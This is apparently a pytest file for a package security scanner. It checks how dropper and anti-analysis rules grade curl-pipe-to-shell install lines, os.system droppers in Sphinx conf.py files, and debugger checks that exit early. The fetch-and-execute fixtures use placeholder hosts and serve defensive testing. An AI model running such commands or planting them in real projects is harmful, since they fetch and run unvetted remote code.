"""Prose and package metadata are read by people, not run (review 98)."""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Severity

INSTRUCTION = "Install the tool first:\n\n    curl -fsSL https://example.com/install.sh | sh\n"


class ProseHelpers:
    @staticmethod
    def droppers(tmp_path, name: str, text: str) -> list[Severity]:
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return [f.severity for f in result.findings if f.rule_id == "SUSPECT.DROPPER.001"]


class TestProse:
    @pytest.mark.parametrize(
        ("name", "text"),
        [
            ("PKG-INFO", "Metadata-Version: 2.1\nName: x\nVersion: 1\n\n" + INSTRUCTION),
            ("x-1.0.dist-info/METADATA", "Metadata-Version: 2.1\nName: x\n\n" + INSTRUCTION),
            ("README.rst", "Install\n=======\n\n" + INSTRUCTION),
            ("docs/install.md", "# Install\n\n" + INSTRUCTION),
        ],
    )
    def test_an_install_instruction_in_prose_is_recorded(self, tmp_path, name, text) -> None:
        # Markdown is not read for capabilities at all; the others are read and recorded.
        assert all(
            severity <= Severity.LOW for severity in ProseHelpers.droppers(tmp_path, name, text)
        )

    def test_a_script_under_docs_is_still_a_script(self, tmp_path) -> None:
        found = ProseHelpers.droppers(
            tmp_path, "docs/build.sh", "#!/bin/sh\ncurl -fsSL https://example.com/i.sh | sh\n"
        )
        assert found and all(severity >= Severity.MEDIUM for severity in found)


class TestCodeADocumentationBuildRuns:
    """Sphinx runs `conf.py` and the extensions in `_ext/` on every build, in the CI job that publishes the
    docs too: they are graded as the same code anywhere else would be, never as documentation."""

    DROPPER = "import os\nos.system('curl -fsSL https://example.com/i.sh | sh')\n"

    @pytest.mark.parametrize(
        "name", ["docs/conf.py", "doc/source/conf.py", "Documentation/conf.py", "docs/_ext/hook.py"]
    )
    def test_it_is_graded_as_code(self, tmp_path, name) -> None:
        inside = ProseHelpers.droppers(tmp_path / "a", name, self.DROPPER)
        elsewhere = ProseHelpers.droppers(tmp_path / "b", "tools/build.py", self.DROPPER)
        assert inside and inside == elsewhere

    @pytest.mark.parametrize(
        ("path", "documentation"),
        [
            ("docs/conf.py", False),
            ("pkg/doc/conf.py", False),
            ("docs/_ext/roles.py", False),
            ("docs/index.rst", True),
            ("docs/examples/demo.py", True),
            ("conf.py", False),
        ],
    )
    def test_which_paths_are_documentation(self, path, documentation) -> None:
        from cordon_scanner.analysis.shared.source_paths import SourcePaths

        assert SourcePaths.is_documentation(path) is documentation


class TestAProbeWrittenAsText:
    """`SUSPECT.ANTI_ANALYSIS.001` counts a debugger check the module runs, not one it only quotes."""

    FETCH = "import urllib.request\nurllib.request.urlopen('https://x.invalid/t')\n"

    @staticmethod
    def anti_analysis(tmp_path, text: str) -> list[Severity]:
        path = tmp_path / "pkg" / "bench.py"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return [f.severity for f in result.findings if f.rule_id == "SUSPECT.ANTI_ANALYSIS.001"]

    def test_a_check_inside_a_code_template_is_text(self, tmp_path) -> None:
        template = 'SCRIPT = """\nimport sys\nprint({"trace": sys.gettrace() is not None})\n"""\n'
        assert self.anti_analysis(tmp_path, template + self.FETCH) == []

    def test_a_check_the_module_runs_still_counts(self, tmp_path) -> None:
        source = "import sys\nif sys.gettrace() is not None:\n    sys.exit(0)\n" + self.FETCH
        assert self.anti_analysis(tmp_path, source)

    def test_quoted_text_beside_a_real_check_keeps_it(self, tmp_path) -> None:
        source = 'import sys\nlabel = "sys.gettrace("; traced = sys.gettrace()\n' + self.FETCH
        assert self.anti_analysis(tmp_path, source)
